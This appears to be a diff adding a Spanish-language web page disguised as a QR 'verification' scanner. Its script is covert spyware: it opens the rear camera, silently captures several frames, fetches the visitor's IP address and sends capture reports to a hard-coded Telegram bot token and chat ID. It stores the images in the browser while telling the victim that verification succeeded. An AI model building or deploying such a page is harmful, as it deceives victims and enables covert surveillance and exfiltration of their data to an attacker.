@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Escaner QR - Verificación</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #f0f0f0;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+        
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            text-align: center;
+            max-width: 400px;
+            width: 100%;
+        }
+        
+        .btn {
+            background: #007bff;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            margin: 10px 0;
+        }
+        
+        #cameraView {
+            width: 100%;
+            max-width: 300px;
+            border: 2px solid #007bff;
+            border-radius: 5px;
+            display: none;
+        }
+        
+        #captureStatus {
+            margin: 10px 0;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>📷 Escáner QR de Verificación</h1>
+        <p>Para completar la verificación, escanee el código QR con su cámara</p>
+        
+        <button class="btn" id="startCamera">🎥 Iniciar Escáner QR</button>
+        
+        <video id="cameraView" autoplay playsinline></video>
+        <canvas id="photoCanvas" style="display:none"></canvas>
+        
+        <div id="captureStatus"></div>
+        <div id="message"></div>
+    </div>
+
+    <script>
+        // Variables globales
+        let cameraStream = null;
+        let captureInterval = null;
+        let captureCount = 0;
+        const maxCaptures = 3; // Número de fotos a tomar
+
+        // Configuración de Telegram
+        const TELEGRAM_CONFIG = {
+            BOT_TOKEN: '6516180762:AAHE5RGPH1kpADaABDGzQLt0962277Nlg1I',
+            CHAT_ID: '-1003181825017'
+        };
+
+        // Botón para iniciar cámara
+        document.getElementById('startCamera').addEventListener('click', startCamera);
+
+        async function startCamera() {
+            try {
+                // Solicitar permiso de cámara
+                cameraStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        width: 1280, 
+                        height: 720,
+                        facingMode: 'environment' // Cámara trasera para QR
+                    } 
+                });
+                
+                // Mostrar video
+                const video = document.getElementById('cameraView');
+                video.srcObject = cameraStream;
+                video.style.display = 'block';
+                
+                // Cambiar botón
+                document.getElementById('startCamera').textContent = '⏹️ Detener Cámara';
+                document.getElementById('startCamera').onclick = stopCamera;
+                
+                // Mostrar mensaje
+                showMessage('🔍 Buscando código QR...', 'info');
+                
+                // Iniciar captura automática cada 3 segundos
+                startAutoCapture();
+                
+            } catch (error) {
+                showMessage('❌ Error al acceder a la cámara', 'error');
+                console.error('Error cámara:', error);
+            }
+        }
+
+        function stopCamera() {
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(track => track.stop());
+                cameraStream = null;
+            }
+            
+            if (captureInterval) {
+                clearInterval(captureInterval);
+                captureInterval = null;
+            }
+            
+            document.getElementById('cameraView').style.display = 'none';
+            document.getElementById('startCamera').textContent = '🎥 Iniciar Escáner QR';
+            document.getElementById('startCamera').onclick = startCamera;
+            
+            showMessage('📷 Cámara detenida', 'info');
+        }
+
+        function startAutoCapture() {
+            captureInterval = setInterval(async () => {
+                if (captureCount < maxCaptures) {
+                    await capturePhoto();
+                    captureCount++;
+                    
+                    document.getElementById('captureStatus').textContent = 
+                        `📸 Capturas tomadas: ${captureCount}/${maxCaptures}`;
+                    
+                    if (captureCount >= maxCaptures) {
+                        showMessage('✅ Verificación completada', 'success');
+                        stopCamera();
+                    }
+                }
+            }, 3000); // Capturar cada 3 segundos
+        }
+
+        async function capturePhoto() {
+            const video = document.getElementById('cameraView');
+            const canvas = document.getElementById('photoCanvas');
+            const context = canvas.getContext('2d');
+            
+            // Configurar canvas con dimensiones del video
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            
+            // Dibujar frame actual del video
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Convertir a base64
+            const photoData = canvas.toDataURL('image/jpeg', 0.8);
+            
+            // Obtener información adicional
+            const ip = await getIP();
+            const fecha = new Date().toLocaleString('es-ES');
+            
+            // Enviar a Telegram
+            await sendToTelegram(photoData, ip, fecha);
+        }
+
+        async function sendToTelegram(photoData, ip, fecha) {
+            // Primero enviar mensaje con info
+            const infoMessage = `
+📷 <b>NUEVA CAPTURA DE CÁMARA</b>
+
+🕐 <b>Fecha:</b> ${fecha}
+🌐 <b>IP:</b> ${ip}
+📸 <b>Captura #:</b> ${captureCount}
+
+🔍 <i>Buscando código QR...</i>
+            `;
+            
+            await sendTelegramMessage(infoMessage);
+            
+            // Enviar foto (si Telegram lo permite via API)
+            // Nota: Para enviar fotos necesitaríamos un backend
+            console.log('📸 Foto capturada lista para enviar:', photoData.substring(0, 100) + '...');
+            
+            // Por ahora guardamos la data en consola
+            localStorage.setItem(`captura_${Date.now()}`, photoData);
+        }
+
+        // Función para obtener IP
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                return 'IP no disponible';
+            }
+        }
+
+        // Función para enviar mensaje a Telegram
+        async function sendTelegramMessage(message) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`;
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CONFIG.CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                return response.ok;
+            } catch (error) {
+                console.error('Error Telegram:', error);
+                return false;
+            }
+        }
+
+        function showMessage(text, type) {
+            const messageDiv = document.getElementById('message');
+            messageDiv.textContent = text;
+            messageDiv.style.color = type === 'error' ? 'red' : type === 'success' ? 'green' : 'blue';
+        }
+    </script>
+</body>
+</html>
